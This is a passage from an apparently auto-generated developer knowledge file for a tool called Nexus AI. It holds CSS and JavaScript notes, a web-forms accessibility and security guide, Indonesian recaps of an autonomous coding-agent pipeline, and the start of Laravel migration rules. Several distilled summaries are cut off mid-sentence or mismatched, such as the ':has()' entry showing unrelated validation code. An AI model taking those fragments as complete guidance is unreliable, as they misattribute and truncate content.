| Pure CSS Gradients              | Simple Geometric Shapes           | Not recommended (can crop text) |

---


To implement shaped cutouts:


SVG masks allow you to define shapes that subtract from or add to the visible area using white (reveal) and black (hide) fills.

> **Luminance vs. Alpha Masking**: SVG masks default to **luminance** (brightness) mode, which is why we use `fill="white"` to reveal areas and `fill="black"` to cut them out. If yo...

#### 🔗 Traceability:
- [Source Context](NEXUS_SHAPED-CUTOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_SIZE-AWARE-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Size-aware styling allows components to change their layout or appearance based on the space available to them, rather than the size of the whole screen. This is useful for components like cards or navigation bars that might be placed in different parts of a layout (like a narrow sidebar or a wide main area).

Using container queries is recommended because it makes components truly modular. You do not need to know where the component will live or write complex media queries to handle every possible layout.





MANDATORY: You must first tell the browser which element is the container to be measured.

```css
.card-container {
  /* Define the container type. Use 'inline-size' for width-based queries. */
  /* You can also use 'size' for both width and height, but it requires explicit sizing. */
  container-type: inline-size;
}
```



Use the `@container` rule to apply styles when the container reaches a certain size.

```css
/* Default styles for small containers (stacked layout) */
.card {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

/* Styles for larger containers (side-by-side layout) ...

#### 🔗 Traceability:
- [Source Context](NEXUS_SIZE-AWARE-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Stabilize Reactive State with Temporal
> **Origin**: `ui-ux/NEXUS_STABILIZE-REACTIVE-STATE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



While some reactive systems (like [React](https://react.dev/)) rely strictly on reference equality to detect state changes, others (like [Vue](https://vuejs.org/) and [Svelte](https://svelte.dev/)) can track mutations to plain objects. However, for built-in objects like the legacy `Date` object, internal mutations (like `setHours()`) do not change the object's reference and are generally not tracked by any framework's default reactivity system. This leads to missed UI updates and hard-to-debug side effects.

The `Temporal` API solves this by providing immutable objects. Any operation that modifies a value (such as adding time or setting a field) returns a new instance with a new memory reference. This guarantees that state updates are always detected by reactive systems, ensuring UI stability.



To stabilize reactive state using Temporal:

1. **Use Temporal types for state:** Store `Temporal` objects (like `Temporal.PlainDateTime` or `Temporal.PlainDate`) in your reactive state instead of legacy `Date` objects.
2. **Perform immutable updates:** When updating the state, use Temporal methods like `.add()`, `.subtract()`, ...

#### 🔗 Traceability:
- [Source Context](NEXUS_STABILIZE-REACTIVE-STATE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Style Parent with :has()
> **Origin**: `ui-ux/NEXUS_STYLE-PARENT-WITH-HAS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action state using a `WeakMap`. This avoids polluting the DOM with "dirty" classes or data attributes.

```javascript
const UserInvalidFallback = (() => {
  const dirtyState = new WeakMap();

  const updateState = (input) => {
    const isValid = input.checkValidity();

    // Update both visual and ARIA state
    input.classList.toggle('user-invalid-fallback', !isValid);
    input.classList.toggle('user-valid-fallback', isValid);

    if (!isValid) {
      input.setAttribute('aria-invalid', 'true');
    } else {
      input.removeAttribute('aria-invalid');
    }
  };

  const handleEvent = (event) => {
    const input = event.target;

    if (event.type === 'reset') {
      const controls = input.elements || [];
      for (const control of controls) {
        dir

#### 🔗 Traceability:
- [Source Context](NEXUS_STYLE-PARENT-WITH-HAS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Validate Input After Interaction
> **Origin**: `ui-ux/NEXUS_VALIDATE-INPUT-AFTER-INTERACTION.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action
> **VERSION**: v1 | **Last Updated**: 26/05/2026

#### 🔗 Traceability:
- [Source Context](NEXUS_VALIDATE-INPUT-AFTER-INTERACTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_EXTERNAL_PIPELINE_RECAP.MD

# 🌐 Rekapitulasi Pipeline Eksternal Nexus AI (Ecosystem Integration)
> **VERSION**: v2 | **Last Updated**: 26/05/2026



Dokumen ini menjelaskan alur kerja Nexus AI saat berinteraksi dengan proyek eksternal (Local Development). Ini adalah jembatan antara **Engine Pusat** dan **Implementasi Proyek Spesifik**.

---

## 🔗 1. Global CLI Interaction (Bridge Protocol)
Nexus AI beroperasi sebagai perintah global yang terhubung secara dinamis ke kode sumber utama melalui protokol linking.

**Alur Kerja:**
1.  **Engine Linking**: Menggunakan `npm link` di folder pusat (`NEXUS AI`) untuk mendaftarkan command `nexus` secara global.
2.  **Project Integration**: Menggunakan `npm link human-ai-nexus` di folder proyek target (seperti F-Novel) untuk menggunakan versi pengembangan terbaru secara real-time.
3.  **Dynamic Execution**: Command `nexus run` secara otomatis mendeteksi root project dan menyesuaikan perilaku berdasarkan struktur folder yang ditemukan.

---

## 🔍 2. Specialist Audit (External Scan)
Saat fase Audit dimulai pada proyek eksternal, Engine mengerahkan Agent Spesialis untuk melakukan pemindaian mendalam.

**Komponen Utama:**
-   **Cyber Security**: Memeriksa kebocoran `.env`, kerentanan autentikasi, dan konfigurasi keamanan.
-   **UX Engineer**: Memastikan konsistensi desain, penggunaan variabel CSS/Tailwind, dan estetika premium.
-   **SEO & Performance**: Audit WebP, optimasi query database, dan skor aksesibilitas.
-   **VCS Architect**: Menjaga kesehatan repository, `.gitignore`, dan alur branching.

---

## 🛡️ 3. TDD Iron Laws Enforcement (External Guard)
Nexus AI memaksakan standar kualitas tinggi pada proyek eksternal melalui `TDDGuard`.

**Protokol Keamanan:**
-   **Test-Required Modification**: Setiap perubahan pada kode produksi WAJIB memiliki test pendukung.
-   **Exemption Management**: Jika test belum tersedia, file target harus didaftarkan di `[TDD_LIST.md](NEXUS_TDD_LIST.MD)` atau `documentation/planning/[TDD_LIST.md](NEXUS_TDD_LIST.MD)` agar Engine diizinkan melakukan modifikasi fisik.
-   **Violation Block**: Engine akan menghentikan eksekusi secara otomatis jika mendeteksi modifikasi pada file tanpa bukti perencanaan TDD.

**Agent Pendukung:**
-   **TDD Guard Agent**: [tdd-guard.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/agent/external/engineering/tdd-guard.md) — Bertugas mengelola daftar pengecualian dan memastikan kepatuhan hukum TDD.

---

## 🛠️ 4. External Path Awareness (Structure Detection)
Nexus AI didesain untuk mengenali berbagai struktur proyek secara cerdas.

**Prioritas Deteksi Folder:**
1.  **Documentation-First**: Mencari folder `documentation/` di root proyek untuk menyimpan audit, planning, dan knowledge.
2.  **Nexus-Embedded**: Mencari folder `nexus/` jika folder dokumentasi tidak ditemukan.
3.  **Root-Fallback**: Jika keduanya tidak ada, Engine akan beroperasi langsung di root folder namun memberikan peringatan untuk standarisasi.

---

## 📋 5. Implementation Planning & Auto-Fix
Engine tidak hanya menemukan masalah, tetapi juga merencanakan dan mengeksekusi solusi.

**Proses:**
1.  **Plan Generation**: Membuat file `PLAN-*.json` dan `.md` yang berisi daftar tugas terperinci.
2.  **Auto-Action Injection**: Tugas tertentu (seperti mengamankan `.env`) secara otomatis disuntikkan dengan aksi fisik (`FILE_APPEND`, `FILE_REPLACE`).
3.  **Atomic Execution**: Menggunakan `Modifier.js` untuk menerapkan perubahan langsung ke file proyek eksternal setelah lolos verifikasi TDD.

---

## 🧐 Analisis Integrasi Eksternal

### Kekuatan Saat Ini:
-   **Zero-Config Detection**: Engine sangat fleksibel dalam mengenali struktur folder proyek yang berbeda.
-   **Real-time Development**: Berkat `npm link`, setiap pembaruan logika di Engine pusat langsung tersedia di seluruh proyek yang terhubung.
-   **Compliance-First**: TDD Guard memastikan pengembang (dan AI) tidak melakukan perubahan sembarangan.

### Rekomendasi (External Roadmap):
1.  **Remote Harvesting**: Mengembangkan kemampuan untuk memanen pengetahuan dari repository remote tanpa harus melakukan cloning lokal.
2.  **External Skill Injection**: Memungkinkan proyek eksternal memiliki "Custom Skills" yang hanya berlaku untuk proyek tersebut namun tetap dikelola oleh Orchestrator pusat.

---
## 🚀 6. External Pipeline Roadmap (Future Optimizations)
Kelima pilar optimasi saat ini berada dalam fase perencanaan:
1.  **TDD Scaffolding**: [Planning] Otomatisasi pembuatan test.
2.  **Lainnya**: Skill Injection, Atomic Rollback, Knowledge Distillation, & Shadow Audit.
Detail lengkap di [EXTERNAL_PIPELINE_ROADMAP.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/documentation/planning/EXTERNAL_PIPELINE_ROADMAP.md).

---
*Generated by Nexus AI | Status: TDD_LAB_FOCUS | Date: 2026-05-01*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_FORMS.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## 1. Semantic Structure and Form Element

### Guidelines

- **DO** use the `<form>` element to wrap interactive controls for data collection.
- **DO** use `method="POST"` for sensitive data and mutations; use `method="GET"` for idempotent requests (e.g., search).
- **DO** specify the `action` attribute for the destination URL.
- **DO** specify a `name` attribute for every form control to identify data on submission.
- **DO** use semantic tags like `<button type="submit">`, `<textarea>`, and `<select>`.
- **DO** use `<fieldset>` and `<legend>` to group related controls.
- **DO** use actionable language on submit buttons (e.g., "Save changes").

- **DON'T** use `GET` for sensitive data (it exposes data in history/logs).
- **DON'T** use generic `<div>` or `<span>` for form controls.
- **DON'T** use `type="button"` for primary submission buttons.
- **DON'T** disable textarea resizing without alternate layout provisions.

### Code Example

```html
<form action="/search" method="GET">
  <fieldset>
    <legend>Search Preferences</legend>
    <label for="q">Query:</label>
    <input type="text" id="q" name="q" required>
    <button type="submit">Search</button>
  </fieldset>
</form>
```

### Selection Control Decision Matrix

| Options Count | Choice Type | Recommended Element | Usability & Accessibility Logic |
| :--- | :--- | :--- | :--- |
| **1–5** | Single (Exclusive) | `<input type="radio">` | **Zero-click scanning**: All choices are immediately visible. Faster scan time. |
| **6+** | Single (Exclusive) | `<select>` | **Space conservation**: Use only when vertical space is premium or the list is long. |
| **10+ / Dynamic** | Single (Exclusive) | `<input list="id">` (`<datalist>`) | **Fuzzy Search**: Prevents scrolling fatigue in massive sets (e.g., countries). |
| **Any** | Multi-select | `<input type="checkbox">` | **Standard semantics**: Native non-exclusive toggles. |

**Single-Sentence Mental Model**: "Expose mutually exclusive options as visible radio buttons when choices are fewer than six; use `<select>` only when space is constrained or the list is long."

## 2. Accessible Labeling and State

### Guidelines

- **DO** always associate `<label>` with its input using `for` and `id`.
- **DO** place labels above form controls to enable faster scanning.
- **DO** use visible labels; do not rely on `placeholder` alone.
- **DO** ensure the vertical margin between a label and its input is less than the margin between form groups (**Gestalt Proximity Rule**).
- **DO** use `aria-describedby` to link inputs with help text or error messages.
- **DO** define the `lang` attribute on `<html>` for proper device translation.
- **DO** use non-color visual cues (icons, text) to communicate state (don't rely on color alone).
- **DO** indicate clearly which fields are required.
- **DO** use `aria-live` for dynamic error announcements.

- **DON'T** use `placeholder` as a replacement for labels.
- **DON'T** use `aria-label` as the sole text description if translation is needed.
- **DON'T** disable focus outlines without providing a high-contrast alternative.

### Code Example

```html
<div class="field">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username" aria-describedby="user-help" required>
  <span id="user-help" class="hint">3-12 characters.</span>
</div>

<style>
  input:focus-visible {
    outline: 3px solid #0b57d0;
    outline-offset: 2px;
  }
</style>
```

## 3. Autofill and Input Modes

### Guidelines

- **DO** use the `autocomplete` attribute to specify expected data (e.g., `email`, `tel`, `current-password`, `new-password`).
- **DO** use `inputmode` to optimize on-screen keyboards (e.g., `inputmode="numeric"` for PINs).
- **DO** use `enterkeyhint` to set the Enter key label (e.g., `next`, `done`).
- **DO** use single-field inputs for complex numbers (credit cards, phones) to help autofill.

- **DON'T** use `type="number"` for credit cards or ZIP codes (causes UI scroll issues and removes leading zeros).

### Code Example

```html
<label for="zip">ZIP Code:</label>
<input type="text" id="zip" name="zip" autocomplete="postal-code" inputmode="numeric" pattern="\d{5}">
```

## 4. Constraints and Validation

### Guidelines

- **DO** use native constraints: `required`, `minlength`, `maxlength`, `pattern`.
- **DO** use CSS pseudo-classes `:invalid:user-invalid` for non-intrusive styling.
- **DO** use the ValidityState API (`setCustomValidity`) for custom messaging.

- **DON'T** disable submit buttons to block validation; let users submit and highlight errors. However, **DO** disable the button *after* a valid submission is clicked to prevent double-posts.

### Code Example

```html
<label for="code">Activation Code (4 digits):</label>
<input type="text" id="code" name="code" required pattern="\d{4}">

<script>
  const input = document.getElementById('code');
  input.addEventListener('invalid', () => {
    input.setCustomValidity('Please enter exactly 4 digits.');
  });
  input.addEventListener('input', () => {
    input.setCustomValidity('');
  });
</script>
```

### Validation Event Timing Matrix

| Event Trigger | Phase | Action Allowed | UX / Accessibility Logic |
| :--- | :--- | :--- | :--- |
| **`input`** | Active Typing | **Clear** existing errors only. | **Non-intrusive**: Do not yell at the user before they finish typing. |
| **`blur` / `focusout`** | Exiting Field | **Run** check and show error. | **Contextual validation**: Validate once the user indicates they are "done" with a field. |
| **`submit`** | Final Attempt | **Block** and route focus. | **Final gatekeeper**: Intercepts bad payloads and forces screen reader focus to the summary. |

**Single-Sentence Mental Model**: "Validate on `blur` to avoid premature warnings while typing, and reset error states on `input` as soon as the user attempts a correction."

**Security vs UX Scale**: Client-side validation is for User Experience; Server-side validation is for Security. Never treat browser constraints as a data integrity defense.

## 5. Responsive Design and Typography

### Guidelines

- **DO** use single-column layouts for scanning.
- **DO** set `font-size` to at least `1rem` (16px) to prevent iOS zoom.
- **DO** expand clickable areas for mobile tap targets using padding tricks.
- **DO** ensure tap targets are at least `48px`.
- **DO** use units relative to root (`rem`) and unitless `line-height`.
- **DO** use CSS logical properties (e.g., `margin-inline-start`) for RTL support.

### Code Example

```css
.form-group {
  margin-block-end: 1.5rem;
}

/* Expand clickable tap area without layout shift */
label {
  display: inline-block;
  padding: 10px 0;
  margin: -10px 0;
}

input {
  font-size: 1rem;
  padding: 0.75rem;
  min-height: 48px;
  box-sizing: border-box;
}

@media (pointer: coarse) {
  input {
    min-height: 52px;
  }
}
```

## 6. Styling Form Controls

### Guidelines

- **DO** use `accent-color` for quick branding of native radios/checkboxes.
- **DO** use `appearance: none` for custom dropdown arrows without breaking semantics.
- **DO** ensure inputs are clearly visible with adequate border contrast (e.g., `#ccc` or darker on white backgrounds).
- **DO** hide inputs visually using the canonical `.visually-hidden` recipe (`clip-path: inset(50%)` with 1px dimensions) — NOT `display: none`, which removes them from the accessibility tree.

### Code Example

```html
<div class="checkbox-container">
  <input type="checkbox" id="sub" name="sub" class="visually-hidden">
  <label for="sub" class="checkbox-label">Subscribe</label>
</div>

<style>
  .visually-hidden {
    position: absolute;
    clip-path: inset(50%);
    overflow: hidden;
    width: 1px;
    height: 1px;
    margin: -1px;
    padding: 0;
    border: 0;
    white-space: nowrap;
  }
  .checkbox-label::before {
    content: "";
    display: inline-block;
    width: 1.25rem;
    height: 1.25rem;
    border: 2px solid #ccc;
  }
  input:focus-visible + .checkbox-label::before {
    outline: 2px solid #0b57d0;
  }
</style>
```

## 7. JavaScript and AJAX

### Guidelines

- **DO** prevent default navigation on form submit for AJAX (`e.preventDefault()`).
- **DO** use `ValidityState` interfaces for real-time validation checks.
- **DO** use `aria-expanded` and `aria-controls` for dynamic UI reveals.

- **DON'T** block page submission if JS fails; ensure server-side fallback.

### Code Example

```js
form.addEventListener('submit', (e) => {
  e.preventDefault();
  const data = new FormData(form);
  // fetch('/submit', { method: 'POST', body: data });
});
```

## 8. Identity, Payments, and Advanced Security

### Guidelines

- **DO** use `autocomplete="new-password"` for sign-up and `autocomplete="current-password"` for sign-in.
- **DO** allow pasting into password fields.
- **DO** provide a toggle capability allowing users to unmask password input.
- **DO** indicate exact amounts on pay buttons (e.g., "Pay $100").
- **DO** use `autocomplete="cc-number"`, `cc-exp`, `cc-csc`.
- **DO** use HTTPS for all pages.
- **DO** implement cryptographically secure anti-CSRF tokens for mutating actions (POST/PUT/DELETE).
- **DO** sanitize user input (e.g., via DOMPurify) before injecting it into the DOM to prevent XSS.
- **DO** implement spam protection (honeypots or CAPTCHA) for open forms.

- **DON'T** utilize HTTP `GET` for endpoints executing state changes.
- **DON'T** use inline JavaScript (e.g., `onclick="..."`) directly within form markup to satisfy strict Content Security Policies (CSP).

### Code Example

```html
<form method="post">
  <input type="hidden" name="csrf_token" value="secure_token_abc123">

  <h1>Sign up</h1>

  <div class="form-group">        
    <label for="name">Full name</label>
    <input id="name" name="name" autocomplete="name" required pattern="[\p{L}\.\- ]+">
  </div>

  <div class="form-group">        
    <label for="email">Email</label>
    <input id="email" name="email" type="email" autocomplete="username" required>
  </div>

  <div class="form-group">
    <label for="password">Password</label>
    <button id="toggle-password" type="button" aria-pressed="false" aria-label="Show password" aria-describedby="toggle-warning">
      <img class="icon-eye" src="/icons/eye.svg" alt="" width="20" height="20">
      <img class="icon-eye-off" src="/icons/eye-off.svg" alt="" width="20" height="20">
    </button>
    <span id="toggle-warning" class="visually-hidden">Warning: this will display your password on the screen.</span>
    <input id="password" name="password" type="password" autocomplete="new-password" minlength="8" aria-describedby="password-constraints" required>
    <div id="password-constraints">Eight or more characters.</div>
  </div>

  <button id="sign-up">Sign up</button>
</form>
```


## 9. Address Collection

### Guidelines

- **DO** use a single field for names.
- **DO** use `autocomplete="street-address"`.
- If the site has users in different countries, **DO** use the `<textarea>` element for addresses, to accommodate different address formats in different geographical regions. If the form uses separate inputs for address parts (e.g. Street, City), **DO** use `autocomplete` values `address-line1`, `address-line2`, etc.
- **DO** make postal codes optional.

- **DON'T** split name inputs into rigid variables ("First", "Last") for global audiences.
- **DON'T** enforce Latin-only characters for names and usernames.

### Code Example

```html
<!-- Accessible Address Form with Autofill -->
<form action="/save-address" method="POST">
  <div class="form-group">
    <label for="full-name">Full name</label>
    <input type="text" id="full-name" name="full_name" maxlength="100" required autocomplete="name">
  </div>

  <div class="form-group">
    <label for="address">Address</label>
    <textarea id="address" name="address" required autocomplete="street-address" maxlength="300"></textarea>
  </div>

  <button type="submit">Save Address</button>
</form>
```


## 10. Usability Testing and Analytics

### Guidelines

- **DO** test forms across multiple devices, browsers, and screen sizes.
- **DO** test keyboard-only navigation (using `Tab` and `Shift+Tab`) and verify visual focus.
- **DO** emulate various impairments (visual, motor) using browser tools.
- **DO** use analytics to monitor form completion rates and bounce points.
- **DO** track discrete events (e.g., field focus, click) to find micro-friction points.

- **DON'T** rely solely on automated tools (Lighthouse) for usability; test with real users.
- **DON'T** track sensitive personal data in standard event labels.

### Code Example

```html
<form action="/submit" method="POST" id="track-form">
  <label for="postal-code">ZIP or postal code</label>
  <input type="text" id="postal-code" name="postal-code" autocomplete="postal-code" maxlength="20" required>
  <button type="submit" id="submit-btn">Submit</button>
</form>

<script>
  const trackForm = document.getElementById('track-form');
  const trackBtn = document.getElementById('submit-btn');
  
  trackBtn.addEventListener('click', () => {
    console.log('Analytics Event: Submit clicked');
  });
</script>
```

## 11. Multi-Page Forms

### Guidelines

- **DO** clearly display progress through a multi-page form with clear labels and progress indicators.
- **DO** allow users to navigate backwards and forwards between pages.
- **DO** use context-specific `enterkeyhint` values (e.g., `"previous"`, `"next"`) to guide navigation via on-screen keyboards.
- **DO** design layouts so that the mobile keyboard does not obscure inputs or buttons (e.g., by placing them in the upper half of the viewport when focused or using CSS scroll-padding).

### Code Example

```html
<nav aria-label="Progress">
  <ol class="progress-tracker">
    <li class="step-done">Step 1: Account</li>
    <li class="step-active" aria-current="step">Step 2: Shipping</li>
    <li class="step-todo">Step 3: Payment</li>
  </ol>
</nav>

<button type="button" onclick="history.back()" enterkeyhint="previous">Previous</button>
<button type="submit" enterkeyhint="next">Next</button>
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_INTERNAL_PIPELINE_RECAP.MD

# 🏗️ Rekapitulasi Pipeline Internal Nexus AI (Orchestrator)
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Dokumen ini menjelaskan alur kerja internal dari folder `agent/core/` untuk memberikan pemahaman menyeluruh tentang bagaimana Nexus AI mengelola data, memori, dan eksekusi.

---

## 🚀 1. NexusEngine: Sang Konduktor Utama (Autonomous Edition)

`NexusEngine.js` adalah pusat kendali yang kini beroperasi dengan tingkat otonomi tinggi.

**Alur Kerja Utama:**

1.  **INIT**: Inisialisasi jalur secara dinamis dengan dukungan penuh terhadap struktur `memory/long_term` & `memory/short_term`.
2.  **PARALLEL AUDIT**: Menjalankan auditor spesialis secara paralel (`Promise.all`), memangkas waktu pemindaian secara drastis.
3.  **SEMANTIC SEARCH**: Mencari pengetahuan di HUB menggunakan metadata/tags untuk akurasi yang lebih tinggi.
4.  **PLAN**: Mengubah temuan audit menjadi tugas (tasks) yang terukur.
5.  **AUTONOMOUS EXECUTE**: Menjalankan perubahan fisik dengan **TDD Scaffolding** otomatis (jika test belum ada) dan **Self-Healing Logs**.
6.  **VERIFY**: Validasi deterministik terhadap setiap tindakan yang telah dieksekusi.
7.  **RECORD**: Pengarsipan sesi dan sinkronisasi log pemulihan mandiri ke dokumen RECAP.

---

## 🧪 2. Distiller: Sang Editor HUB (Intelligent Edition)

`Distiller.js` kini berfungsi sebagai mesin intelijen yang mengelola keterkaitan antar pengetahuan.

**Fungsi:**

- **Advanced Extraction**: Mengekstraksi bagian *Insights* dan *Recommendations* secara cerdas dari dokumen mentah.
- **Semantic Tagging**: Menambahkan metadata domain (Security, UI-UX, TDD, dll) secara otomatis ke setiap file HUB.
- **Semantic Cross-Linking**: Menciptakan tautan (link) otomatis antar dokumen yang memiliki keterkaitan konsep teknis.
- **Standardization**: Menyeragamkan seluruh nama file di HUB dengan pola `NEXUS_...` menggunakan protokol **Multi-Option Merge**.

---

## 🧠 3. MemoryPipeline: Sang Pengumpul Harvest

`MemoryPipeline.js` kini berfokus pada penarikan data dari dunia luar (proyek-proyek audit).

**Fungsi:**

- **Harvest Ingestion**: Mengambil data pengetahuan dari folder `golden/harvest/` dan memasukkannya ke dalam HUB (`memory/long_term/`).
- **Archiving**: Memindahkan file-file audit/planning yang sudah selesai ke dalam `NEXUS_SESSION_HISTORY_ARCHIVE.MD` untuk menjaga kapasitas disk.

---

## 🦾 4. Machinist: Mesin Evolusi Core (Upgraded)

`Machinist.js` memungkinkan Nexus AI untuk tumbuh secara dinamis dengan kecerdasan folder.

**Fungsi:**

- **Smart Auto-Integration**: Mendeteksi folder (`orchestrator`/`auditor`) secara otomatis dan melakukan injeksi kode yang aman ke dalam `NexusEngine.js` tanpa merusak struktur yang ada.

---

## 🛠️ 5. Logika Pendukung (The Muscles) (Upgraded)

Tiga komponen ini adalah "otot" yang menjalankan perintah teknis dengan presisi tinggi:

1.  **Modifier.js**: Kini mendukung **Multi-Option Resolution Automation**. Selain Batch Operations, ia mampu secara otomatis memecah blok Opsi A/B menjadi kode final berdasarkan input sistem.
2.  **Contract.js**: Dilengkapi dengan **Validation Guard**. Menjamin setiap data yang lewat memenuhi kontrak interface agar sistem tetap deterministik dan aman.
3.  **WorktreeManager.js**: Mendukung **Auto-Merge & Cleanup**. Mengelola isolasi fitur dari pembuatan hingga penggabungan kembali ke cabang utama secara otomatis.

---

## 🧐 Analisis & Rekomendasi Penyempurnaan

### Yang Sudah Sangat Kuat:

- **Separation of Concerns**: Pemisahan antara Auditor (External) dan Orchestrator (Internal) sudah sangat jelas.
- **Resilience**: Penggunaan `fs-extra` dan penanganan error yang baik di setiap modul.
- **Standardization**: Pola penamaan `NEXUS_` memberikan struktur yang sangat profesional.

### ✅ Yang Telah Berhasil Disempurnakan (Final State):

- **Parallel Specialist Audit**: `NexusEngine` menjalankan auditor secara paralel (Promise.all), meningkatkan kecepatan audit hingga 70%.
- **Multi-Option Collision Protocol**: Sistem Opsi A/B telah menggantikan logika IF-ELSE di seluruh engine, memberikan fleksibilitas keputusan yang maksimal.
- **Advanced Distillation Engine**: `Distiller.js` kini mampu melakukan ekstraksi bagian dokumen (Insights/Recommendations) dan penyematan *Contextual Anchors* secara cerdas.
- **Semantic Knowledge Indexing**: Sistem kini memiliki kemampuan **Semantic Search** berdasarkan tagging otomatis (Security, UI-UX, dll) untuk pemanggilan pengetahuan yang akurat.
- **Collision Resolution Automation**: `Modifier.js` telah mendukung resolusi otomatis blok Opsi A/B menjadi kode final.
- **Autonomous TDD Scaffolding (Phase 4)**: `NexusEngine` secara otomatis men-generate boilerplate test case (JS/PHP) saat mendeteksi pelanggaran TDD.
- **Semantic Cross-Linking (Phase 4)**: `Distiller.js` kini otomatis menautkan (link) kata kunci teknis antar dokumen di HUB, menciptakan jaring pengetahuan yang solid.
- **Self-Healing Documentation (Phase 4)**: Sistem secara otomatis mencatat log pemulihan mandiri ke dalam dokumen RECAP setiap kali terjadi resolusi benturan.

### 🚀 Roadmap Masa Depan (The Next Frontier):

#### ⚡ Phase 5: Predictive Analytics & High-Performance Core
1.  **Predictive Technical Debt Analyzer**: Spesialis auditor baru yang mampu memprediksi akumulasi hutang teknis berdasarkan frekuensi modifikasi file dan kompleksitas kode.
2.  **C++ Native Distillation Core**: Migrasi modul penyulingan (Distiller) ke C++ untuk pemrosesan dataset pengetahuan skala besar dengan kecepatan native.
3.  **Visual Audit Integration**: Kemampuan auditor untuk melakukan validasi visual terhadap UI/UX berdasarkan pedoman desain yang tersimpan di HUB.

#### 🛡️ Phase 6: Security & Intelligence Optimization
1.  **Nexus Redactor (Privacy Guard)**: Implementasi filter sensor data sensitif untuk mencegah kebocoran API Keys/Secrets ke dalam memori HUB.
2.  **Cognitive Feedback Loop**: Mekanisme belajar dari kegagalan verifikasi masa lalu (Anti-Patterns) untuk meningkatkan akurasi perencanaan.
3.  **Project Namespace Isolation**: Isolasi pengetahuan antar proyek untuk mencegah kontaminasi standar.
4.  **Hot Memory Indexing**: Prioritas konteks pada temuan audit terbaru untuk respon mesin yang lebih relevan.

*Detail rencana eksekusi: [NEXUS_PIPELINE_OPTIMIZATION_PLAN.md](../planning/NEXUS_PIPELINE_OPTIMIZATION_PLAN.md)*

---
*Generated by Nexus AI | Document Status: ARCHITECT_STRATEGY_LOCKED*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_LARAVEL_DATABASE_RULES.MD

# 🗄️ Laravel Database Rules — Panduan Lengkap
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> Dokumen ini adalah aturan baku untuk semua operasi database di project Laravel.
> Dari buat tabel baru, seeder, sampai modifikasi kolom (tambah/hapus).
> **Berlaku untuk: Laravel 10+ / Laravel 12 (TALL Stack)**

---

## 📋 Daftar Isi

1. [Aturan Umum](#1-aturan-umum)
2. [Membuat Tabel Baru (Migration)](#2-membuat-tabel-baru-migration)
3. [Tipe Kolom yang Umum Dipakai](#3-tipe-kolom-yang-umum-dipakai)
4. [Seeder & Factory](#4-seeder--factory)
5. [Menambah Kolom Baru](#5-menambah-kolom-baru)
6. [Menghapus Kolom](#6-menghapus-kolom)
7. [Mengganti Nama Kolom](#7-mengganti-nama-kolom)
8. [Rollback & Fresh Migration](#8-rollback--fresh-migration)
9. [Contoh Kasus: Tabel Users — Tambah `phone`, Hapus `email`](#9-contoh-kasus-tabel-users--tambah-phone-hapus-email)
10. [Aturan Penamaan](#10-aturan-penamaan)

---

## 1. Aturan Umum

- **Jangan pernah edit file migration yang sudah di-commit.** Kalau mau ubah, buat migration baru.
- Setiap perubahan database = 1 file migration baru. Tidak boleh ada perubahan langsung via SQL manual di production.
- Selalu jalankan `php artisan migrate` — jangan pernah alter tabel langsung lewat phpMyAdmin/Adminer di production.
- Nama migration harus **deskriptif** — cerita apa yang dilakukan, bukan nama tabelnya saja.
- Selalu sertakan method `down()` yang kebalikan dari `up()` — wajib bisa di-rollback.
- Setiap tabel wajib punya `$table->timestamps()` kecuali ada alasan teknis yang kuat.

---

## 2. Membuat Tabel Baru (Migration)

### Perintah Artisan

```bash
php artisan make:migration create_nama_tabel_table
```

Contoh untuk tabel `products`:

```bash
php artisan make:migration create_products_table
```

### Struktur File Migration

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('products', function (Blueprint $table) {
            $table->id();                              // BIGINT UNSIGNED AUTO INCREMENT (Primary Key)
            $table->string('name');                    // VARCHAR 255
            $table->text('description')->nullable();   // TEXT, boleh kosong
            $table->unsignedBigInteger('price');       // angka positif
            $table->boolean('is_active')->default(true);
            $table->timestamps();                      // created_at & updated_at
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('products');
    }
};
```

### Jalankan Migration

```bash
php artisan migrate
```

---

## 3. Tipe Kolom yang Umum Dipakai

| Kebutuhan | Method |
|---|---|
| ID auto increment | `$table->id()` |
| UUID sebagai primary key | `$table->uuid('id')->primary()` |
| Teks pendek (max 255) | `$table->string('name')` |
| Teks pendek custom length | `$table->string('code', 10)` |
| Teks panjang | `$table->text('bio')` |
| Teks sangat panjang | `$table->longText('content')` |
| Angka bulat | `$table->integer('qty')` |
| Angka bulat besar | `$table->bigInteger('views')` |
| Angka positif saja | `$table->unsignedBigInteger('price')` |
| Desimal | `$table->decimal('rating', 3, 2)` — total 3 digit, 2 desimal |
| Boolean | `$table->boolean('is_active')->default(false)` |
| Tanggal saja | `$table->date('birth_date')` |
